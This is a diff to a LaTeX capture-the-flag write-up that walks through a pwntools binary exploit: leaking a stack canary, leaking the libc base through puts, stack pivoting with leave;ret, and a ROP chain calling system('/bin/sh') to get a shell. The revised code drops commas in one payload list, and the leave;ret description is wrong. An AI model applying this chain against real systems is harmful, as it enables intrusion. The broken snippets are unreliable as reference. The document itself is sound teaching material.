@@ -246,7 +246,7 @@ To understand the mitigations the pwntools library help us, in fact there is a f
     exploit code to leak the canary:
     \begin{verbatim} 
     io.sendafter(b">", b"A"*56) # sending after char ">" 56*A 
-    io.recvuntil(b'Hello '+ b'A'*56) #recive the output until HelloAAAA....A
+    io.recvuntil(b'Hello '+ b'A'*56) 
     canary=io.recv(8) # save the canary  
     svb=io.recvuntil(b'Nice' , drop=True) 
     canary=b"\x00"+canary[1:8] # fixing the byte we overwrite to leak the canary
@@ -312,7 +312,8 @@ To understand the mitigations the pwntools library help us, in fact there is a f
     \paragraph{Leak the Libc base}
     To leak the base address of libc we will perform a puts of an got fuction address and after the leak, we will calculate the base of the libc doing :\newline
     \begin{verbatim}
-        base Libc = address function with ASLR - fuction address with out ASLR  
+        base Libc = address function with ASLR - fuction address
+        with out ASLR  
     \end{verbatim}
     Follow the exploit code.\newline.
     \begin{verbatim}
@@ -320,19 +321,37 @@ To understand the mitigations the pwntools library help us, in fact there is a f
         pop_rdi=0x4012fb
         puts1=0x84420      
         payload2=flat(
-             p64(pop_rdi),#address of pop rdi
-             p64(exe.got.puts),#address of got puts fucnion
-             p64(exe.sym.puts),#address that will actualy print the got puts addres
-             p64(0x00401292), #ret 
-             p64(exe.sym.main),#calling main again
-             b'A'*16,#fill the remaining space of the buffer
-             p64(real_canary), #send the canary to bypass the canary mitigation
-             p64(target_bp), #send the target base pointe    
+             p64(pop_rdi),
+             p64(exe.got.puts)
+             p64(exe.sym.puts)
+             p64(0x00401292), 
+             p64(exe.sym.main),
+             b'A'*16,
+             p64(real_canary), 
+             p64(target_bp), 
         )
         io.sendafter(b">", payload2)
     \end{verbatim}
         
-    Here is the exploit as we can see at the beginning I saved the addresses of pop rdi which is very useful because it allows us to populate the contents of the syscall, then the address of puts without base and then calculate it later.\newline
-    Subsequently I will write the rop that will allow me to do stack pivoting and leak the puts address to calculate the base of the libc.\newline
-
-    DEVO RI EXPLOITARE LA CHALLENGE NON RICORDO DELLE COSE LOL
+    in this specific case we don't have space to write the rop chain after the return address so previously in addition to the canary I saved the base pointer so as to overwrite the current base pointer with the value of the previous leaked one -0x68 (size of our stack frame).\newline
+    By doing this, when we go to call the return we will perform a stack pivoting so we will move the stack and we will correctly leak the contents of the libc.\newline
+    The call that will allow us to do stack pivoting is the leave ret call that is made every time we exit a function.\newline
+    In fact leave ret executes the following instructions mov rsp,rbp; pop rbp; por rdi;\newline
+    Subsequently we will perform the same attack but instead of leaking libc we will perform remote command execution, following is the code that allowed us to launch this attack.\newline
+    \begin{verbatim}
+    payload2=flat(
+        p64(pop_rdi), #start of the rop 
+        p64(binsh+base),#address of bin sh + base
+        p64(system+base), #address of system + base
+        b'A'*32, #fill the remaining space of the buffer
+        p64(real_canary), # send the canary to bypass the canary mitigation
+        p64(target_bp2),# send the target base pointer 
+    )   
+    \end{verbatim}
+    We will call as return address a call to system("/bin/sh").\newline
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=0.5\linewidth]{rce_stack_chall.png}
+        \caption{remote coomand execution}
+        \label{fig:enter-label}
+    \end{figure}
